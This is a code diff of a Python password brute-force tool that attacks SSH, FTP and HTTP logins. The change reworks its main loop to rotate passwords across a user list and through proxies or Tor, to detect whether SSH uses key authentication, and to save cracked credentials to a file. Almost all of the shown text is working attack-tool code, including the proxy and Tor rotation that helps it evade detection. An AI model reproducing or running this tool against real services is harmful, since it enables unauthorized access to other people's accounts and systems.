@@ -232,7 +232,7 @@ def http_attack(ip, user, password, http_post_params, success_pattern, failure_p
         print(
             f"\n{Fore.WHITE}[{Fore.CYAN}HTTP-RESPONSE{Fore.WHITE}]{Fore.RESET}:CONTENT LENGTH: = {len(response.content)}\n")
         print(f"{Fore.WHITE}[{Fore.CYAN}HTTP-RESPONSE{Fore.WHITE}]{Fore.RESET}: \n{response.text[:2000]}")
-      
+
         if failure_content_length is not None and response_length == failure_content_length:
             return False  # Indicates failure
 
@@ -413,11 +413,12 @@ if __name__ == '__main__':
         args = parse_arguments()
         iterations = args.iterations
         time.sleep(0.5)
+        
         service = args.service[0]
         port = get_port(args)
-
         if args.rand:
             args.wordlist = generate_random_password_list()
+
 
         if args.tor and args.proxies:
             print(
@@ -426,30 +427,26 @@ if __name__ == '__main__':
 
         if args.tor:
             handle_timeout(set_up_tor)
-
-        if args.tor:
-            handle_timeout(set_up_tor)
         if isinstance(port, int):
-            print(
-                f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Service: {Fore.YELLOW}{service}{Fore.RESET}")
+            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Service: {Fore.YELLOW}{service}{Fore.RESET}")
             print(
                 f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Port: {Fore.YELLOW}{port}{Fore.RESET}")
             if not is_service_running(args.ip, port, service):
-                print(
-                    f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RED}ERROR: No service running on the specified port.")
+                print(f"{Fore.RED}ERROR: No service running on the specified port.")
                 exit(1)
 
 
         else:
-            print(
-                f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Service: {Fore.YELLOW}{service}{Fore.RESET}")
+            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Service: {Fore.YELLOW}{service}{Fore.RESET}")
             print(
                 f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Port: {Fore.YELLOW}{port}{Fore.RESET}")
 
             if not is_service_running(args.ip, port, service):
-                print(
-                    f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} ERROR: No service running on the specified port.")
+                print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} ERROR: No service running on the specified port.")
                 exit(1)
+
+
+
 
         proxies = []
         if args.proxies:
@@ -460,39 +457,77 @@ if __name__ == '__main__':
         users = [line.strip() for line in open(args.users, 'r', encoding='latin-1').readlines()]
 
         password_chunk_size = 3
-        proxy_gen = cycle_through_proxies(proxies) if proxies else None
+        first_iteration = True
+      
+        proxy_gen = None
+        if proxies:
+            proxy_gen = cycle_through_proxies(proxies)
+        ssh_auth_type_checked = False
+        for i in range(0, len(passwords), password_chunk_size):
+            for idx, user in enumerate(users):
+             
+                proxy_ip, proxy_port = next(proxy_gen) if proxy_gen else (None, None)
 
-        for user in users:
-            for i in range(0, len(passwords), password_chunk_size):
+                if proxy_ip:
+                    print(
+                        f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Using proxy {proxy_ip}:{proxy_port}")
+
+                if idx == 0:
+                    if not first_iteration:
+                        print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Returning to first user...")
+                else:
+                    print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Switching to next user....")
+
+                if 'ssh' in service and not ssh_auth_type_checked:
+                    print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Checking SSH authentication type.")
+                    time.sleep(0.6)
+                    auth_type = test_ssh_auth_type(args.ip)
+                    print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Detected {auth_type}.")
+                    if auth_type == "RSA key authentication":
+                        print(
+                            f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} RSA Key authentication, Bruteforce will not work. Exiting.")
+                        exit(0)
+                    else:
+                        print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} Continuing..")
+                    ssh_auth_type_checked = True
+
                 for j in range(min(iterations, len(passwords) - i)):
                     if i + j >= len(passwords):
                         break
                     password = passwords[i + j]
                     print(current_timestamp(),
-                          f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Trying user [*]{Fore.YELLOW}{user}{Fore.RESET}[*] with password: {Fore.YELLOW}{password}")
+                          f"Trying user [*]{Fore.YELLOW}{user}{Fore.RESET}[*] with password: {Fore.YELLOW}{password}")
                     attempt_count += 1
                     time_elapsed = time.time() - start_time
-
                     if 'ssh' in service:
-                        if not is_service_running(args.ip, port, service):
-                            print(
-                                f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} ERROR: No SSH service running.")
-                            exit(1)
-                        if handle_timeout(ssh_attack, args.ip, port, user, password, proxy_ip, proxy_port):
-                            print(current_timestamp(),
-                                  f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} Password found for [*]{user}[*] in [{time_elapsed:.2f} seconds] with [{attempt_count} tries]. PASS = {Fore.BLUE}{password} ")
-                            save_to_file(args.ip, args.service, user, password, attempt_count)
-                            users.remove(user)
-                            break
+                        if not ssh_auth_type_checked:
+                            auth_type = test_ssh_auth_type(args.ip)
+                            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Detected {auth_type}.")
+                            if auth_type == "RSA key authentication":
+                                print(current_timestamp(),
+                                      f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} RSA Key authentication, Bruteforce will not work. Exiting")
+                                exit(0)
+                            ssh_auth_type_checked = True
+                        if port is not None:
+                            port = int(port)
+                        else:
+                            port = 22
 
+                        if handle_timeout(ssh_attack, args.ip, port, user, password, proxy_ip, proxy_port):
+
+                            print(
+                                f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} Password found for [*]{user}[*] in [{time_elapsed:.2f} seconds] with [{attempt_count} tries]. PASS = {Fore.BLUE}{password} ")
+                            save_to_file(args.ip, args.service, user, password, attempt_count)  # Added attempt_count
+                            users.remove(user)
+                         
+                            break
                     elif 'ftp' in service:
                         if handle_timeout(ftp_attack, args.ip, user, password, proxy_ip, proxy_port):
-                            print(current_timestamp(),
-                                  f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} Password found for [*]{user}[*] in [{time_elapsed:.2f} seconds] with [{attempt_count} tries]. PASS = {Fore.BLUE}{password} ")
-                            save_to_file(args.ip, args.service, user, password, attempt_count)
+                            print(
+                                f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} Password found for [*]{user}[*] in [{time_elapsed:.2f} seconds] with [{attempt_count} tries]. PASS = {Fore.BLUE}{password} ")
+                            save_to_file(args.ip, args.service, user, password, attempt_count)  # Added attempt_count
                             users.remove(user)
                             break
-
                     elif 'http' in service:
                         if not args.http_post:
                             raise ValueError(
@@ -520,14 +555,16 @@ if __name__ == '__main__':
                                 f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Failed attempt for user {Fore.YELLOW}{user}{Fore.RESET} with pass: {Fore.YELLOW}{password}")
                             time.sleep(0.3)
 
-        print(current_timestamp(),
-              f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.BLUE} Brute force completed.")
+            first_iteration = False
+
+        print(current_timestamp(), f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.BLUE} Brute force completed. FSK - Written by: Derek Johnston")
+
+        if args.rand:
+            os.remove(args.wordlist)
 
     except KeyboardInterrupt:
-        print("\n", current_timestamp(), f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} ATTACK STOPPED.")
+        print("\n", current_timestamp(), f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} ATTACK STOPPED. FSK - Written by: Derek Johnston")
         exit(0)
     except EOFError:
-        print("\n", current_timestamp(),
-              f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Unexpected End of File (EOF) encountered. Exiting.")
+        print("\n", current_timestamp(), f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Unexpected End of File (EOF) encountered. Exiting.")
         exit(1)
-
